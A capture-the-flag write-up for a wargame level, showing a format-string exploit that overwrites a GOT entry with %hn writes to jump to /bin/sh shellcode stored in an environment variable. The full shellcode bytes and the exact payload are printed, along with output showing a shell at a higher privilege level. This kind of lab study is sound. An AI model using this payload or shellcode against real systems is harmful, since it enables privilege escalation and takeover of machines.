# level05

The [target program](source.c) contains only a `main()` function, that `fgets()` 100 characters from stdin into a buffer, transform every uppercase character into their lowercase counterpart, and then gives the buffer as the first argument of `printf()`, we will abuse of printf flags to overwrite the GOT and inject a jump to our shellcode stored in an environment variable:

The payload consists of the usual voodoo magic of multiple intertwined `%p` and `%hn` flags to set the correct value for printf to write. We use two `%hn` flags to write two shorts (u16) to two different addresses to prevent having to print 64 bit amount of characters for the actual address value.

Finally, we can shove it in the stdin and get a nice little shell :3

```
$ export OUIOUI=$'\xc3\x31\xc9\xf7\xe1\xb0\x0b\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80'
$ (echo -en '\xe0\x97\x04\x08lmao\xe2\x97\x04\x08%010p%010p%010p%010p%010p%010p%010p%010p%057018p%hn%08425p%hn'; cat) | ./level05
...
id
uid=1005(level05) gid=1005(level05) euid=1006(level06) egid=100(users) groups=1006(level06),100(users),1005(level05)
```

We are logged as level05 now :3

